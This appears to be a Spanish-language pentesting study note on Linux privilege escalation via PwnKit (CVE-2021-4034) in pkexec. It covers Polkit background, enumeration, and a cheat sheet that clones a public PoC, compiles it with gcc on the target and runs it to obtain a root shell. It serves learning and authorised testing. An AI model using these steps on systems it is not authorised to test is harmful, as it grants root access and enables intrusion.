---
tags:
  - linux
  - privex
  - polkit
  - cve
---
## Conceptos Clave (TL;DR)

- **Polkit (PolicyKit)** es el servicio de autorización de Linux que decide si un proceso de usuario puede ejecutar acciones de componentes del sistema. Define permisos de forma granular por usuario y por aplicación (permitir/denegar, exigir auth de admin, validez por sesión/proceso, etc.).
- **`pkexec`** es el binario clave: funciona igual que `sudo`, permite ejecutar un programa con privilegios de otro usuario o de **root**.
- **CVE-2021-4034 (PwnKit)** es una corrupción de memoria en `pkexec` oculta durante +10 años (publicada nov 2021, parcheada ~2 meses después). Es un **LPE (Local Privilege Escalation)** que otorga root directo.
- El exploit requiere descargar un PoC en C y **COMPILARLO** en el target (o en un sistema idéntico) -> dependencia de un compilador (`gcc`).

## Herramientas Clave

- `pkexec` - Ejecuta programas con permisos de otro usuario/root (equivalente a `sudo`). Es el **binario vulnerable**.
- `pkaction` - Muestra las acciones/policies definidas en polkit (útil para enumeración).
- `pkcheck` - Verifica si un proceso está autorizado para una acción concreta.
- `git` - Clonar el repositorio del PoC.
- `gcc` - Compilar el código C del exploit directamente en el target.

## Metodología Paso a Paso

**Fase 1 - Identificación / Enumeración**
Confirmar que `pkexec` existe en el sistema y comprobar su versión. PwnKit no depende de configuración (sudoers, SUID custom), solo de la **presencia del binario vulnerable**, por eso es un vector extremadamente fiable y casi universal en sistemas de la época.

**Fase 2 - (Opcional) Validar uso legítimo de pkexec**
Probar `pkexec` en su uso normal ayuda a confirmar que el binario está presente y operativo antes de lanzar el exploit.

**Fase 3 - Descarga y compilación del PoC**
Clonar el repo del exploit y compilarlo con `gcc`. El código está en C y debe compilarse para la arquitectura del target. Si el target no tiene compilador, hay que compilar en un sistema **gemelo** (misma arch/distro) y subir únicamente el binario resultante.

**Fase 4 - Explotación**
Ejecutar el binario compilado. Al terminar, abre una shell con `uid=0` (root).

**Fase 5 - Verificación**
Ejecutar `id` para confirmar `uid=0(root)`.

## Cheat Sheet de Comandos

> Nota: Es una escalada **LOCAL**, no hay `<TARGET_IP>` que cambiar (ya tienes shell de usuario sin privilegios). El único valor realmente variable es el usuario objetivo en el uso legítimo de `pkexec`. La URL del repo y los nombres de archivo del PoC son fijos.

```bash
# --- DETECCION ---

# Muestra la version de pkexec. Versiones sin parchear (aprox < 0.120) son vulnerables a PwnKit
pkexec --version

# Localiza el binario y confirma que conserva el bit SUID (la 's' en los permisos)
which pkexec
ls -l "$(which pkexec)"
```

```bash
# --- USO LEGITIMO DE PKEXEC (referencia) ---

# Ejecuta <COMMAND> como <TARGET_USER>  (equivalente a: sudo -u <TARGET_USER> <COMMAND>)
#   -u  => especifica el usuario con cuyos privilegios se ejecuta el comando
pkexec -u <TARGET_USER> <COMMAND>

# Ejemplo del modulo: ejecuta 'id' como root -> deberia devolver uid=0(root)
pkexec -u root id
```

```bash
# --- EXPLOTACION (CVE-2021-4034) ---

# Clona el PoC publico de arthepsy para PwnKit
git clone https://github.com/arthepsy/CVE-2021-4034.git

# Entra al directorio del exploit
cd CVE-2021-4034

# Compila el codigo C del PoC y genera el binario llamado 'poc'
#   -o poc  => define el nombre del ejecutable de salida
gcc cve-2021-4034-poc.c -o poc

# Ejecuta el exploit; al terminar cambia de la shell estandar (sh) a bash con privilegios root
./poc

# Dentro de la nueva shell (prompt '#'), verifica que somos root
id
# Salida esperada: uid=0(root) gid=0(root) groups=0(root)
```

## "Gotchas" y Troubleshooting

- **Requisito de compilación:** El PoC está en C y hay que compilarlo. Necesitas `gcc`/`cc` en el target. Si NO hay compilador, compílalo en un sistema **idéntico** (misma arquitectura/distro) y sube solo el binario `poc` ya compilado.
- **Cambio de shell:** Tras `./poc` pasas de `sh` a `bash`. El prompt cambia a `#`, señal visual de que eres root.
- **Condición de vulnerabilidad:** Solo afecta a `pkexec` **sin parchear** (publicado nov 2021, parcheado ~ene 2022). Sistemas actualizados NO son vulnerables; comprueba siempre con `pkexec --version` antes de invertir tiempo.
- **No depende de configuración:** A diferencia de los vectores típicos de sudo/SUID, PwnKit NO requiere reglas en sudoers ni binarios SUID especiales; basta con que exista el binario vulnerable. Esto lo hace muy fiable como "quick win".
- **Es LPE, no acceso remoto:** Necesitas YA tener una shell de usuario sin privilegios en la máquina. No sirve como vector de entrada inicial.
- **Archivos/rutas de Polkit (enumeración y contexto):**
  - Acciones/policies: `/usr/share/polkit-1/actions`
  - Reglas: `/usr/share/polkit-1/rules.d`
  - Reglas locales personalizadas: `/etc/polkit-1/localauthority/50-local.d` (extensión `.pkla`)
- **Herramientas auxiliares para mapear permisos:** usa `pkaction` para listar acciones definidas y `pkcheck` para validar autorizaciones concretas si necesitas entender la config de polkit del host.